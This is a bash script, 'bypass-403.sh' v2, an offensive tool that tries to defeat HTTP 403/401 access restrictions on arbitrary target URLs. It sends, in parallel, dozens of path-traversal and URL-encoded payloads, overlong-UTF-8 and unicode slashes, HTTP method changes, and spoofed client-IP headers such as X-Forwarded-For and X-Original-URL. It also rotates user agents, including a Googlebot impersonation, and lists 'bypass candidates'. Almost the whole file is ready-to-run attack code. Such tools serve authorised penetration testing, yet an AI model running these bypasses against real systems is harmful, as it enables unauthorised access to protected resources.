#!/bin/bash
# ──────────────────────────────────────────────────────────────────────────────
#  bypass-403.sh  |  Enhanced 403 Bypass Tool   (v2)
#  Original by Iam_J0ker  |  Enhanced version
#
#  Usage:
#    ./bypass-403.sh [options] https://target.com path
#    ./bypass-403.sh [options] https://target.com/path
#    ./bypass-403.sh [options] -l targets.txt          # one target per line
#    cat targets.txt | ./bypass-403.sh [options]       # read targets from STDIN
#    some-cmd | ./bypass-403.sh -                      # explicit STDIN
#    ./bypass-403.sh -c -l targets.txt                 # classify-only (no fuzzing)
#
#  Target line format (file or STDIN):
#    https://target.com path          # URL + path (space/tab separated)
#    https://target.com/path          # full URL (path split automatically)
#    target.com/path                  # scheme defaults to https
#    # comment                          (lines starting with # are ignored)
#
#  New in v2
#    -l <file>   Read targets from a file (URL or "URL path" per line)
#    -           Read targets from STDIN (also auto-detected when piped)
#    -c          Classify only: report the layer of the response (no fuzzing)
#    -r          Follow redirects (OFF by default — prevents SPA catch-all
#                "302 -> /app" being reported as a false-positive 200 bypass)
#    Layer detection for 401/403: differentiates APPLICATION-layer
#    (auth/permission) from WEB-SERVER-layer (nginx/Apache/IIS/ACL) 403s so you
#    know whether the path/method/header bypasses below are even applicable.
#
#  Options:
#    -t, --threads <num>    Threads / parallel jobs (default: 10)
#    -T, --timeout <sec>    Timeout per request     (default: 10)
#    -f, --filter <codes>   Only show status codes  (e.g. 200,301,302)
#    -o, --output <file>    Save output to file
#    -l, --list <file>      Read targets from a file
#    -a, --all              Show all results including 403/404
#    -c, --classify-only    Classify only (report response layer, no fuzzing)
#    -r, --follow-redirects Follow redirects (default: off)
#    -h, --help             Help
#        --version          Show version
#  Every long option also accepts an "=" form, e.g. --timeout=15
# ──────────────────────────────────────────────────────────────────────────────

# ─── COLORS ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; BOLD='\033[1m'; RESET='\033[0m'
BLUE='\033[0;34m'

# ─── DEFAULTS ─────────────────────────────────────────────────────────────────
THREADS=10
TIMEOUT=10
FILTER=""          # e.g. "200,301" — only show these codes
OUTFILE=""
SHOW_ALL=false
BASELINE_SIZE=""
LISTFILE=""
CLASSIFY_ONLY=false
FOLLOW_REDIRECTS=false

# ─── BANNER ───────────────────────────────────────────────────────────────────
banner() {
  echo -e "${CYAN}"
  command -v figlet &>/dev/null && figlet -f small "Bypass-403" || echo "=== Bypass-403 ==="
  echo -e "  Enhanced Edition v2  |  By Iam_J0ker${RESET}"
  echo ""
}

# ─── USAGE ────────────────────────────────────────────────────────────────────
usage() {
  echo -e "${BOLD}Usage:${RESET}"
  echo "  ./bypass-403.sh [options] https://target.com path"
  echo "  ./bypass-403.sh [options] https://target.com/path"
  echo "  ./bypass-403.sh [options] -l targets.txt"
  echo "  cat targets.txt | ./bypass-403.sh [options]"
  echo ""
  echo -e "${BOLD}Input:${RESET}"
  echo "  -l, --list <file>      read targets from file (one per line: URL or \"URL path\")"
  echo "  -                      read targets from STDIN (auto when piped)"
  echo ""
  echo -e "${BOLD}Options:${RESET}"
  echo "  -t, --threads <num>    Threads / parallel jobs (default: 10)"
  echo "  -T, --timeout <sec>    Timeout per request     (default: 10)"
  echo "  -f, --filter <codes>   Only show status codes  (e.g. 200,301,302)"
  echo "  -o, --output <file>    Save output to file"
  echo "  -a, --all              Show all results including 403/404"
  echo "  -c, --classify-only    Classify only (report response layer, no fuzzing)"
  echo "  -r, --follow-redirects Follow redirects (default: off)"
  echo "  -h, --help             This help"
  echo "      --version          Show version"
  echo ""
  echo -e "${BOLD}Examples:${RESET}"
  echo "  ./bypass-403.sh https://target.com admin"
  echo "  ./bypass-403.sh -t 20 -f 200,302 -o results.txt https://target.com secret"
  echo "  cat urls.txt | ./bypass-403.sh -c            # triage 403 type for many URLs"
  echo "  waybackurls target.com | ./bypass-403.sh -l -"
  exit 0
}

# ─── ARG PARSING ──────────────────────────────────────────────────────────────
# Translate GNU-style long options to the short options getopts understands.
# Supported: --help, --version, --threads, --timeout, --filter, --output,
#            --list, --all, --classify-only, --follow-redirects
SHORT_ARGS=()
while (( $# )); do
  case "$1" in
    --help)                              usage ;;
    --version)                           echo "bypass-403.sh v2"; exit 0 ;;
    --threads)                           SHORT_ARGS+=(-t "$2"); shift 2 ;;
    --threads=*)                         SHORT_ARGS+=(-t "${1#*=}"); shift ;;
    --timeout)                           SHORT_ARGS+=(-T "$2"); shift 2 ;;
    --timeout=*)                         SHORT_ARGS+=(-T "${1#*=}"); shift ;;
    --filter)                            SHORT_ARGS+=(-f "$2"); shift 2 ;;
    --filter=*)                          SHORT_ARGS+=(-f "${1#*=}"); shift ;;
    --output)                            SHORT_ARGS+=(-o "$2"); shift 2 ;;
    --output=*)                          SHORT_ARGS+=(-o "${1#*=}"); shift ;;
    --list)                              SHORT_ARGS+=(-l "$2"); shift 2 ;;
    --list=*)                            SHORT_ARGS+=(-l "${1#*=}"); shift ;;
    --all)                               SHORT_ARGS+=(-a); shift ;;
    --classify-only|--classify)          SHORT_ARGS+=(-c); shift ;;
    --follow|--follow-redirects)         SHORT_ARGS+=(-r); shift ;;
    --) shift; while (( $# )); do SHORT_ARGS+=("$1"); shift; done ;;
    *)                                   SHORT_ARGS+=("$1"); shift ;;
  esac
done
set -- "${SHORT_ARGS[@]}"

while getopts "t:T:f:o:al:crh" opt; do
  case $opt in
    t) THREADS="$OPTARG" ;;
    T) TIMEOUT="$OPTARG" ;;
    f) FILTER="$OPTARG" ;;
    o) OUTFILE="$OPTARG" ;;
    a) SHOW_ALL=true ;;
    l) LISTFILE="$OPTARG" ;;
    c) CLASSIFY_ONLY=true ;;
    r) FOLLOW_REDIRECTS=true ;;
    h) usage ;;
    *) usage ;;
  esac
done
shift $((OPTIND - 1))

# ─── COLLECT RAW TARGET LINES ─────────────────────────────────────────────────
RAW_LINES=()

if [[ -n "$LISTFILE" ]]; then
  if [[ ! -r "$LISTFILE" ]]; then
    banner
    echo -e "${RED}Error: list file not readable: ${LISTFILE}${RESET}"
    exit 1
  fi
  while IFS= read -r l || [[ -n "$l" ]]; do RAW_LINES+=("$l"); done < "$LISTFILE"
fi

# Positional args: "URL path" (2) or "URL" (1) or "-" (STDIN)
if (( $# >= 2 )); then
  RAW_LINES+=("$1 $2")
elif (( $# == 1 )); then
  if [[ "$1" == "-" ]]; then
    while IFS= read -r l || [[ -n "$l" ]]; do RAW_LINES+=("$l"); done
  else
    RAW_LINES+=("$1")
  fi
fi

# Auto-read STDIN when piped and nothing was supplied
if (( ${#RAW_LINES[@]} == 0 )) && [[ ! -t 0 ]]; then
  while IFS= read -r l || [[ -n "$l" ]]; do RAW_LINES+=("$l"); done
fi

if (( ${#RAW_LINES[@]} == 0 )); then
  banner
  echo -e "${RED}Error: no target supplied (give URL+path, -l <file>, or pipe via STDIN).${RESET}"
  usage
fi

# ─── PARSE TARGETS -> PTARGET[i] / PPATH[i] ───────────────────────────────────
PTARGET=(); PPATH=()
for line in "${RAW_LINES[@]}"; do
  line="${line%$'\r'}"                                       # strip CR (CRLF files)
  trimmed="$(printf '%s' "$line" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
  [[ -z "$trimmed" || "$trimmed" == \#* ]] && continue
  f1="$(printf '%s' "$trimmed" | awk '{print $1}')"
  f2="$(printf '%s' "$trimmed" | awk '{$1=""; sub(/^[[:space:]]+/,""); print}')"
  if [[ "$f1" =~ ^https?:// && -n "$f2" ]]; then
    PTARGET+=("${f1%/}"); PPATH+=("${f2#/}")
  else
    url="$f1"; [[ "$url" =~ ^https?:// ]] || url="https://$url"
    if [[ "$url" =~ ^(https?://[^/]+)(/.*)?$ ]]; then
      PTARGET+=("${BASH_REMATCH[1]}"); PPATH+=("${BASH_REMATCH[2]#/}")
    fi
  fi
done

if (( ${#PTARGET[@]} == 0 )); then
  banner
  echo -e "${RED}Error: could not parse any valid target.${RESET}"
  exit 1
fi

# ─── OUTPUT FILE ──────────────────────────────────────────────────────────────
if [[ -z "$OUTFILE" ]]; then
  TS="$(date +%Y%m%d-%H%M%S)"
  if (( ${#PTARGET[@]} == 1 )); then
    SLUG="$(echo "${PTARGET[0]}" | sed 's|https\?://||;s|[/:]|-|g')"
    if [[ -n "${PPATH[0]}" ]]; then
      OUTFILE="bypass403-${SLUG}-${PPATH[0]//\//-}-${TS}.txt"
    else
      OUTFILE="bypass403-${SLUG}-${TS}.txt"
    fi
  else
    OUTFILE="bypass403-multi-${TS}.txt"
  fi
fi

# ─── SHARED RESULTS ───────────────────────────────────────────────────────────
TMPDIR_RES=$(mktemp -d)
FINDINGS_FILE="${TMPDIR_RES}/findings.txt"
touch "$FINDINGS_FILE"

# ─── USER AGENTS ──────────────────────────────────────────────────────────────
UA_LIST=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 Safari/605.1.15"
  "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
  "Googlebot/2.1 (+http://www.google.com/bot.html)"
  "curl/7.88.1"
)
rand_ua() { echo "${UA_LIST[$((RANDOM % ${#UA_LIST[@]}))]}"; }

# ─── OUTPUT HELPER ────────────────────────────────────────────────────────────
tee_out() { echo -e "$1" | tee -a "$OUTFILE"; }

# ─── 403 LAYER CLASSIFIER ─────────────────────────────────────────────────────
# $1 = header file, $2 = body file  ->  "LAYER|reason|content-type|server"
classify_response() {
  local hdrf="$1" bodyf="$2" ctype server b
  ctype="$(grep -i '^content-type:' "$hdrf" 2>/dev/null | head -1 | tr -d '\r' | cut -d' ' -f2-)"
  server="$(grep -i '^server:' "$hdrf" 2>/dev/null | head -1 | tr -d '\r' | cut -d' ' -f2-)"
  b="$(head -c 8192 "$bodyf" 2>/dev/null)"

  # 1) JSON / structured application error
  if printf '%s' "$ctype" | grep -qi 'application/json' \
     || printf '%s' "$b" | grep -qE '\{[^{}]*"(error|detail|status_code|message|errors?)"[[:space:]]*:'; then
    echo "APPLICATION|json/structured error body|${ctype:-none}|${server:-none}"; return
  fi
  # 2) WAF / proxy block pages (checked before app heuristics)
  if printf '%s' "$b" | grep -qiE 'The requested URL was rejected|Request Rejected|Request Blocked|Request unsuccessful|Attention Required!|Incapsula|ModSecurity|Support ID|Barracuda|Web Application Firewall'; then
    echo "WEB-SERVER|waf/block page|${ctype:-none}|${server:-none}"; return
  fi
  # 3) stock web-server error page signatures
  if printf '%s' "$b" | grep -qiE '<center>nginx</center>|<title>403 Forbidden</title>|Apache/[0-9]|Apache Server at|Microsoft-IIS|<h1>403 Forbidden</h1>|openresty|LiteSpeed'; then
    echo "WEB-SERVER|web-server error signature|${ctype:-none}|${server:-none}"; return
  fi
  # 4) application framework markers
  if printf '%s' "$b" | grep -qiE 'django|csrf|rest_framework|DRF|Anmeldedaten|Authentication credentials were not provided|Ubitec|ASP\.NET|<title>Log in|action="[^"]*login'; then
    echo "APPLICATION|app-framework marker|${ctype:-none}|${server:-none}"; return
  fi
  # 5) full HTML "app chrome" page (branded portal / custom app error page)
  if printf '%s' "$b" | grep -qiE '<html|<script|stylesheet|<form|StatusCode:|Request ID:'; then
    echo "APPLICATION|full html app page|${ctype:-none}|${server:-none}"; return
  fi
  # 6) web-server header + generic forbidden body
  if printf '%s' "$server" | grep -qiE 'nginx|apache|microsoft-iis|litespeed|caddy|openresty|cloudflare|envoy|traefik' \
     && printf '%s' "$b" | grep -qiE 'forbidden|access denied|not authorized|403'; then
    echo "WEB-SERVER|server=${server} + generic forbidden body|${ctype:-none}|${server}"; return
  fi
  # 7) weak fallbacks
  if printf '%s' "$b" | grep -qiE '^[[:space:]]*<'; then
    echo "UNKNOWN|html body, no known signature|${ctype:-none}|${server:-none}"; return
  fi
  echo "UNKNOWN|no signature|${ctype:-none}|${server:-none}"
}

# ─── BASELINE (+ layer classification) ────────────────────────────────────────
BL_H=""; BL_B=""; BASELINE_LAYER="UNKNOWN"; BASELINE_CODE=""
get_baseline() {
  BL_H="$(mktemp)"; BL_B="$(mktemp)"
  local extra=(); [[ "$FOLLOW_REDIRECTS" == true ]] && extra=(-L)
  read -r BASELINE_CODE BASELINE_SIZE < <(curl -k -s "${extra[@]}" -D "$BL_H" -o "$BL_B" \
      -w "%{http_code} %{size_download}" --max-time "$TIMEOUT" -A "$(rand_ua)" \
      "${TARGET}/${PATH2}" 2>/dev/null)

  local cls layer reason ctype server
  cls="$(classify_response "$BL_H" "$BL_B")"
  IFS='|' read -r layer reason ctype server <<<"$cls"
  BASELINE_LAYER="$layer"

  tee_out "${BOLD}Baseline:${RESET} HTTP ${BASELINE_CODE}  size: ${BASELINE_SIZE} bytes  ctype: ${ctype}  server: ${server}"
  tee_out "Baseline layer: ${BOLD}${layer}${RESET}  (${reason})"
  if [[ "$BASELINE_CODE" == "403" && "$layer" == "APPLICATION" ]]; then
    tee_out "${YELLOW}${BOLD}!! APPLICATION-layer 403 (auth/permission), not a web-server ACL.${RESET}"
    tee_out "${YELLOW}   Path/method/header 403-bypass tricks below mostly defeat WEB-SERVER 403s.${RESET}"
    tee_out "${YELLOW}   App-layer 403 usually needs a real auth flaw or a valid session.${RESET}"
  elif [[ "$BASELINE_CODE" == "403" && "$layer" == "WEB-SERVER" ]]; then
    tee_out "${CYAN}${BOLD}>> WEB-SERVER-layer 403 — the bypasses below are relevant.${RESET}"
  fi
}

# ─── CORE REQUEST FUNCTION ────────────────────────────────────────────────────
do_request() {
  local label="$1"; shift
  local result code size time color line fp_flag="" layer_tag=""

  local extra=(); [[ "$FOLLOW_REDIRECTS" == true ]] && extra=(-L)

  result=$(curl -k -s "${extra[@]}" -o /dev/null -i \
    -w "%{http_code},%{size_download},%{time_total}" \
    --max-time "$TIMEOUT" \
    -A "$(rand_ua)" \
    "$@" 2>/dev/null)

  code="${result%%,*}"
  local rest="${result#*,}"
  size="${rest%%,*}"
  time="${rest##*,}"

  # Tag auth/permission responses with the baseline's layer
  if [[ "$code" == "401" || "$code" == "403" ]]; then
    layer_tag=" ${BLUE}[layer:${BASELINE_LAYER}]${RESET}"
  fi

  # False positive detection — same size as baseline 403 (and not 403/404)
  if [[ -n "$BASELINE_SIZE" && "$size" == "$BASELINE_SIZE" && "$code" != "403" && "$code" != "404" ]]; then
    fp_flag=" ${YELLOW}[possible FP — same size as baseline]${RESET}"
  fi

  # Filter by status code if -f given
  if [[ -n "$FILTER" ]]; then
    echo "$FILTER" | tr ',' '\n' | grep -qx "$code" || return
  elif [[ "$SHOW_ALL" == false ]]; then
    [[ "$code" == "403" || "$code" == "404" || "$code" == "000" ]] && return
  fi

  # Color by code
  case "$code" in
    200)            color="$GREEN" ;;
    301|302|307)    color="$YELLOW" ;;
    401|403)        color="$RED" ;;
    500|501|502)    color="$MAGENTA" ;;
    *)              color="$RESET" ;;
  esac

  printf -v line "  [%s] size:%-8s time:%-6ss  %s%s" "$code" "$size" "$time" "$label" "$(echo "$layer_tag" | sed 's/\x1b\[[0-9;]*m//g')"
  echo -e "  [${color}${BOLD}${code}${RESET}] size:${size}\t time:${time}s\t ${label}${layer_tag}${fp_flag}"
  echo "$line" >> "$OUTFILE"

  # Save interesting finds
  if [[ "$code" != "403" && "$code" != "404" && "$code" != "000" ]]; then
    echo "[$code] size:$size  $label" >> "$FINDINGS_FILE"
  fi
}

# ─── PARALLEL RUNNER ──────────────────────────────────────────────────────────
JOBS=0
run_parallel() {
  do_request "$@" &
  ((JOBS++))
  if (( JOBS >= THREADS )); then
    wait
    JOBS=0
  fi
}

# ─── CLASSIFY-ONLY MODE ───────────────────────────────────────────────────────
classify_only() {
  local h b code size cls layer reason ctype server color
  h="$(mktemp)"; b="$(mktemp)"
  local extra=(); [[ "$FOLLOW_REDIRECTS" == true ]] && extra=(-L)
  read -r code size < <(curl -k -s "${extra[@]}" -D "$h" -o "$b" \
      -w "%{http_code} %{size_download}" --max-time "$TIMEOUT" -A "$(rand_ua)" \
      "${TARGET}/${PATH2}" 2>/dev/null)
  if [[ "$code" == "401" || "$code" == "403" ]]; then
    cls="$(classify_response "$h" "$b")"
    IFS='|' read -r layer reason ctype server <<<"$cls"
  else
    layer="n/a"; reason="not a 401/403"
    ctype="$(grep -i '^content-type:' "$h" 2>/dev/null | head -1 | tr -d '\r' | cut -d' ' -f2-)"
  fi
  case "$code" in
    200) color="$GREEN" ;;
    403) [[ "$layer" == "APPLICATION" ]] && color="$YELLOW" || color="$RED" ;;
    401|404) color="$MAGENTA" ;;
    *) color="$RESET" ;;
  esac
  printf "  [%b%s%b] %-45s  layer=%-11s size=%-7s ctype=%s\n" \
    "$color" "$code" "$RESET" "${TARGET}/${PATH2}" "$layer" "$size" "${ctype:-none}"
  echo "[$code] layer=$layer ($reason) size=$size ctype=${ctype:-none} server=${server:-none} ${TARGET}/${PATH2}" >> "$OUTFILE"
  rm -f "$h" "$b"
}

# ─── PER-TARGET PROCESSING ────────────────────────────────────────────────────
process_target() {
  get_baseline

  # ─── SECTION 1: PATH MANIPULATION ───────────────────────────────────────────
  tee_out "\n${BOLD}${CYAN}━━━ PATH MANIPULATION ━━━${RESET}"

  PATH_VARIANTS=(
    "${TARGET}/${PATH2}"
    "${TARGET}/%2e/${PATH2}"
    "${TARGET}/${PATH2}/."
    "${TARGET}//${PATH2}//"
    "${TARGET}/./${PATH2}/./"
    "${TARGET}/${PATH2}%20"
    "${TARGET}/${PATH2}%09"
    "${TARGET}/${PATH2}?"
    "${TARGET}/${PATH2}.html"
    "${TARGET}/${PATH2}.php"
    "${TARGET}/${PATH2}.json"
    "${TARGET}/${PATH2}/?anything"
    "${TARGET}/${PATH2}#"
    "${TARGET}/${PATH2}/*"
    "${TARGET}/${PATH2}..;/"
    "${TARGET}/${PATH2};/"
    "${TARGET}/${PATH2}//"
    "${TARGET}/${PATH2}/./."
    "${TARGET}/${PATH2}../"
    "${TARGET}/${PATH2};%09"
    "${TARGET}/${PATH2};%2f"
    "${TARGET}/${PATH2}%2f%2f"
    "${TARGET}/${PATH2}%252f"
    "${TARGET}/${PATH2}%2e"
    "${TARGET}/${PATH2}/;"
    "${TARGET}/${PATH2}%3b"
  )
  for url in "${PATH_VARIANTS[@]}"; do
    run_parallel "$url" "$url"
  done
  wait; JOBS=0

  # ─── SECTION 2: HTTP METHOD BYPASS ──────────────────────────────────────────
  tee_out "\n${BOLD}${CYAN}━━━ HTTP METHOD BYPASS ━━━${RESET}"

  for method in GET POST PUT PATCH DELETE OPTIONS TRACE HEAD CONNECT PROPFIND; do
    run_parallel "${TARGET}/${PATH2} [-X ${method}]" -X "$method" "${TARGET}/${PATH2}"
  done
  run_parallel "${TARGET}/${PATH2} [POST + Content-Length:0]" \
    -H "Content-Length:0" -X POST "${TARGET}/${PATH2}"
  run_parallel "${TARGET}/${PATH2} [POST + body]" \
    -X POST -d "x=1" "${TARGET}/${PATH2}"
  wait; JOBS=0

  # ─── SECTION 3: HEADER BYPASSES ─────────────────────────────────────────────
  tee_out "\n${BOLD}${CYAN}━━━ HEADER BYPASSES ━━━${RESET}"

  HEADERS=(
    "Base-Url: 127.0.0.1" "Client-IP: 127.0.0.1" "Http-Url: 127.0.0.1"
    "Proxy-Host: 127.0.0.1" "Proxy-Url: 127.0.0.1" "Real-Ip: 127.0.0.1"
    "Redirect: 127.0.0.1" "Referer: 127.0.0.1" "Referrer: 127.0.0.1"
    "Refferer: 127.0.0.1" "Request-Uri: 127.0.0.1" "Uri: 127.0.0.1"
    "Url: 127.0.0.1" "X-Client-IP: 127.0.0.1" "X-Custom-IP-Authorization: 127.0.0.1"
    "X-Forward-For: 127.0.0.1" "X-Forwarded-By: 127.0.0.1"
    "X-Forwarded-For-Original: 127.0.0.1" "X-Forwarded-For: 127.0.0.1"
    "X-Forwarded-Host: 127.0.0.1" "X-Forwarded-Port: 80" "X-Forwarded-Port: 443"
    "X-Forwarded-Port: 4443" "X-Forwarded-Port: 8080" "X-Forwarded-Port: 8443"
    "X-Forwarded-Scheme: http" "X-Forwarded-Scheme: https"
    "X-Forwarded-Server: 127.0.0.1" "X-Forwarded: 127.0.0.1"
    "X-Forwarder-For: 127.0.0.1" "X-Host: 127.0.0.1"
    "X-Http-Destinationurl: 127.0.0.1" "X-Http-Host-Override: 127.0.0.1"
    "X-Original-Remote-Addr: 127.0.0.1" "X-Original-Url: /${PATH2}"
    "X-Originating-IP: 127.0.0.1" "X-Proxy-Url: 127.0.0.1" "X-Real-Ip: 127.0.0.1"
    "X-Remote-Addr: 127.0.0.1" "X-Remote-IP: 127.0.0.1"
    "X-Rewrite-Url: /${PATH2}" "X-True-IP: 127.0.0.1" "X-Original-URL: /${PATH2}"
    "X-Forwarded-For: localhost" "X-Forwarded-For: 0.0.0.0"
    "X-Forwarded-For: 192.168.1.1" "X-Forwarded-For: 10.0.0.1"
    "X-Forwarded-For: ::1" "X-Custom-IP-Authorization: localhost"
    "X-Custom-IP-Authorization: 0.0.0.0" "X-ProxyUser-Ip: 127.0.0.1"
    "Via: 1.0 127.0.0.1" "CF-Connecting-IP: 127.0.0.1" "True-Client-IP: 127.0.0.1"
    "Cluster-Client-IP: 127.0.0.1" "X-Azure-ClientIP: 127.0.0.1"
    "Forwarded: for=127.0.0.1" "Forwarded: for=localhost"
  )
  for header in "${HEADERS[@]}"; do
    run_parallel "${TARGET}/${PATH2} [-H '${header}']" -H "$header" "${TARGET}/${PATH2}"
  done
  wait; JOBS=0

  # ─── SECTION 4: URL ENCODED PATH PAYLOADS ───────────────────────────────────
  tee_out "\n${BOLD}${CYAN}━━━ ENCODED PATH PAYLOADS ━━━${RESET}"

  PAYLOADS=(
    "%09" "%09%3b" "%09.." "%09;" "%20" "%23" "%23%3f"
    "%252f%252f" "%252f/" "%2e%2e" "%2e%2e/"
    "%2f" "%2f%20%23" "%2f%23" "%2f%2f" "%2f%3b%2f"
    "%2f%3b%2f%2f" "%2f%3f" "%2f%3f/" "%2f/" "%2f;?" "%2f?;"
    "%3b" "%3b%09" "%3b%2f%2e%2e" "%3b%2f%2e." "%3b%2f.."
    "%3b/%2e." "%3b/%2f%2f../" "%3b/.." "%3b//%2f../"
    "%3f%23" "%3f%3f" "%3f.php"
    ".." "..%00/" "..%09" "..%0d/" "..%5c/" "..%ff/"
    "../" "..;" ".html" ".json"
    "/#" "/%20" "/%20%23" "/%23"
    "/%252e%252e%252f/" "/%252e%252e%253b/"
    "/%2e%2e" "/%2e%2e/" "/%2e/" "/%2f" "/%3b/"
    "/.." "/..%2f" "/..%2f..%2f" "/../" "/../../"
    "/..//" "/../;/" "/..;/" "/..;/../" "/..;/..;/"
    "/..;//" "/./" "/.;/" "//" "//../../"
    "//..;" "//;/" "/;/" "/;//" "/;?" "/;x/" "/?"
    "/x/../" "/x/../;/" "/x/..;/" "/x//../"
    ";" ";%09" ";%2F.." ";%2f.." ";%2f../"
    ";/.." ";/../" ";/../../" "?"
    "?#" "?.php" "?;" "///" "/%2f/" "//%2f"
    "%2f/%2f" "%2f%2f%2f" "%2f//"
  )
  for payload in "${PAYLOADS[@]}"; do
    run_parallel "${TARGET}/${PATH2}${payload}" "${TARGET}/${PATH2}${payload}"
  done
  wait; JOBS=0

  # ─── SECTION 5: UNICODE & SPECIAL NORMALIZATION ─────────────────────────────
  tee_out "\n${BOLD}${CYAN}━━━ UNICODE / NORMALIZATION BYPASS ━━━${RESET}"

  UNICODE_PAYLOADS=(
    "$(echo -e "\xef\xbc\x8f")"   # fullwidth slash
    "$(echo -e "\xe2\x81\x84")"   # fraction slash
    "$(echo -e "\xc0\xaf")"       # overlong UTF-8 /
    "%c0%af" "%e0%80%af" "%c0%2f" "%2f%c0%af"
    "%u002f" "%u2215" "%u2216"
  )
  for u in "${UNICODE_PAYLOADS[@]}"; do
    run_parallel "${TARGET}/${PATH2}${u} [unicode]" "${TARGET}/${PATH2}${u}"
  done
  wait; JOBS=0

  # ─── SECTION 6: PROTOCOL & PORT VARIATION ───────────────────────────────────
  tee_out "\n${BOLD}${CYAN}━━━ PROTOCOL / PORT VARIATION ━━━${RESET}"

  DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
  for proto in "http" "https"; do
    for port in 80 443 8080 8443 8000 8888; do
      run_parallel "${proto}://${DOMAIN}:${port}/${PATH2}" \
        "${proto}://${DOMAIN}:${port}/${PATH2}"
    done
  done
  wait; JOBS=0

  # ─── SECTION 7: CASE VARIATION ──────────────────────────────────────────────
  tee_out "\n${BOLD}${CYAN}━━━ CASE VARIATION ━━━${RESET}"

  UPPER=$(echo "$PATH2" | tr '[:lower:]' '[:upper:]')
  LOWER=$(echo "$PATH2" | tr '[:upper:]' '[:lower:]')
  MIXED="${PATH2^}"
  for variant in "$UPPER" "$LOWER" "$MIXED"; do
    [[ -z "$variant" ]] && continue
    run_parallel "${TARGET}/${variant} [case]" "${TARGET}/${variant}"
  done
  wait; JOBS=0

  # ─── SECTION 8: DOUBLE HEADER / COMBINATION ─────────────────────────────────
  tee_out "\n${BOLD}${CYAN}━━━ DOUBLE HEADER / COMBINATION ━━━${RESET}"

  run_parallel "${TARGET}/${PATH2} [X-Forwarded-For + X-Original-URL]" \
    -H "X-Forwarded-For: 127.0.0.1" -H "X-Original-URL: /${PATH2}" "${TARGET}/${PATH2}"
  run_parallel "${TARGET}/${PATH2} [CF-Connecting-IP + X-Real-Ip]" \
    -H "CF-Connecting-IP: 127.0.0.1" -H "X-Real-Ip: 127.0.0.1" "${TARGET}/${PATH2}"
  run_parallel "${TARGET}/${PATH2} [X-Forwarded-For: 127.0.0.1 + Scheme: https]" \
    -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Scheme: https" "${TARGET}/${PATH2}"
  run_parallel "${TARGET}/${PATH2} [via + X-Client-IP]" \
    -H "Via: 1.0 127.0.0.1" -H "X-Client-IP: 127.0.0.1" "${TARGET}/${PATH2}"
  wait; JOBS=0

  # ─── SECTION 9: WAYBACK MACHINE ─────────────────────────────────────────────
  tee_out "\n${BOLD}${CYAN}━━━ WAYBACK MACHINE ━━━${RESET}"
  if command -v jq &>/dev/null; then
    curl -s "https://archive.org/wayback/available?url=${TARGET}/${PATH2}" \
      | jq -r '.archived_snapshots.closest | "Available: \(.available)  URL: \(.url)"' \
      | tee -a "$OUTFILE"
  else
    tee_out "(jq not found — skipping wayback lookup)"
  fi

  rm -f "$BL_H" "$BL_B"
}

# ──────────────────────────────────────────────────────────────────────────────
#  MAIN
# ──────────────────────────────────────────────────────────────────────────────
banner
tee_out "${BOLD}Targets :${RESET} ${#PTARGET[@]}"
tee_out "${BOLD}Threads :${RESET} ${THREADS}  |  Timeout: ${TIMEOUT}s  |  Follow redirects: ${FOLLOW_REDIRECTS}"
tee_out "${BOLD}Output  :${RESET} ${OUTFILE}"
tee_out "${BOLD}Started :${RESET} $(date)"
tee_out ""

for i in "${!PTARGET[@]}"; do
  TARGET="${PTARGET[$i]}"; PATH2="${PPATH[$i]}"
  tee_out "\n${BOLD}${MAGENTA}════════════════════════════════════════════════════════════${RESET}"
  tee_out "${BOLD}${MAGENTA}  TARGET $((i+1))/${#PTARGET[@]}: ${TARGET}/${PATH2}${RESET}"
  tee_out "${BOLD}${MAGENTA}════════════════════════════════════════════════════════════${RESET}"

  if [[ "$CLASSIFY_ONLY" == true ]]; then
    classify_only
  else
    process_target
  fi
done

# ─── SUMMARY ──────────────────────────────────────────────────────────────────
tee_out "\n${BOLD}${CYAN}━━━━━━━━━━━━━━━━ SUMMARY ━━━━━━━━━━━━━━━━${RESET}"
tee_out "${BOLD}Finished :${RESET} $(date)"
tee_out "${BOLD}Output   :${RESET} ${OUTFILE}"

if [[ "$CLASSIFY_ONLY" == true ]]; then
  tee_out "\n${GREEN}Layer breakdown (app vs web-server):${RESET}"
  grep -oE 'layer=[A-Z-]+' "$OUTFILE" | sort | uniq -c | \
    awk '{printf "  %s x %s\n", $1, $2}' | tee -a "$OUTFILE"
elif [[ -s "$FINDINGS_FILE" ]]; then
  tee_out "\n${GREEN}${BOLD}✔ BYPASS CANDIDATES (non-403/404):${RESET}"
  sort "$FINDINGS_FILE" | uniq | tee -a "$OUTFILE"
  COUNT=$(wc -l < "$FINDINGS_FILE")
  tee_out "\n${GREEN}${BOLD}Total interesting responses: ${COUNT}${RESET}"
  tee_out "\n${BOLD}Status code breakdown:${RESET}"
  grep -oP '^\[\K[0-9]+' "$FINDINGS_FILE" | sort | uniq -c | \
    awk '{printf "  %s x %s\n", $1, $2}' | tee -a "$OUTFILE"
else
  tee_out "\n${RED}${BOLD}✘ No bypasses found. All responses returned 403/404.${RESET}"
fi

rm -rf "$TMPDIR_RES"
